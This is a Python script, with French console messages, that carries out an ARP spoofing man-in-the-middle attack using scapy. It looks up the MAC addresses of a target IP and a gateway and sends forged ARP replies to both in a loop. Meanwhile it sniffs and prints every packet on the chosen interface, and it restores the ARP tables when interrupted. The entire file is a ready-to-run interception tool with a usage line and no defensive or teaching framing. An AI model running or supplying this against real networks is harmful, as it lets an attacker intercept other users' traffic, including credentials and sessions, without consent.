from scapy.all import ARP, Ether, send, sniff, srp
import sys
import time
import threading
import queue

stop_flag = threading.Event()

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Impossible de trouver l'adresse MAC pour {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        print(f"Impossible de trouver les adresses MAC pour {destination_ip} ou {source_ip}")
        return

    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def capture_packets(interface, stop_event):
    print("[INFO] Démarrage de la capture des paquets...")
    sniff(iface=interface, store=False, prn=lambda x: x.show(), stop_filter=lambda x: stop_event.is_set())

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python arp_spoof_capture.py <Target IP> <Gateway IP> <Interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    def stop_attack(signal, frame):
        global stop_flag
        print("\n[INFO] Interruption détectée. Rétablissement des tables ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[INFO] Tables ARP rétablies. Arrêt du programme.")
        stop_flag.set()
        print("[INFO] Au revoir !")
        sys.exit(0)

    print("[INFO] Récupération des adresses MAC...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("Impossible de récupérer les adresses MAC. Vérifiez les adresses IP et réessayez.")
        sys.exit(1)

    print(f"L'adresse MAC de {target_ip} est {target_mac}")
    print(f"L'adresse MAC de {gateway_ip} est {gateway_mac}")

    print("[INFO] Démarrage de l'attaque ARP Spoofing et de la capture des paquets...")
    thread = threading.Thread(target=capture_packets, args=(interface, stop_flag))
    thread.start()

    try:
        while True:
            if stop_flag.is_set():
                break
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        stop_attack(None, None)
